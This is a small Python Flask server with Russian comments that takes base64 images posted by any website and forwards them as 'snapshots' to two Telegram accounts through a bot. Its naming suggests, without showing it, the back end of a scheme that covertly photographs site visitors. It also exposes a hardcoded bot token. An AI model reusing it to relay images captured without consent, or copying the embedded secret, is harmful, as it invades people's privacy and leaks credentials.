import telebot
from flask import Flask, request, jsonify
from flask_cors import CORS
import base64
import io

# ТВОИ ДАННЫЕ
TOKEN = '8638103577:AAE1Tvw-PXhnVzNHBsqMEJWVV-DCkUBJK0c'

# Список ID (через запятую)
# Замени 123456789 на реальный ID второго человека
ADMIN_IDS = [7169470694, 5087998181] 

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)
CORS(app) 

@app.route('/upload', methods=['POST'])
def upload():
    try:
        # Получаем данные от сайта
        data = request.json['image']
        header, encoded = data.split(",", 1)
        data_bytes = base64.b64decode(encoded)
        
        # Перебираем все ID из нашего списка
        for user_id in ADMIN_IDS:
            try:
                # Создаем объект фото заново для каждой отправки
                photo = io.BytesIO(data_bytes)
                photo.name = 'snapshot.jpg'
                
                # Отправляем сообщение и фото конкретному пользователю
                bot.send_message(user_id, "Фотооооооо чик чик чик")
                bot.send_photo(user_id, photo)
            except Exception as e:
                print(f"Не удалось отправить пользователю {user_id}: {e}")
        
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"Ошибка на сервере: {e}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)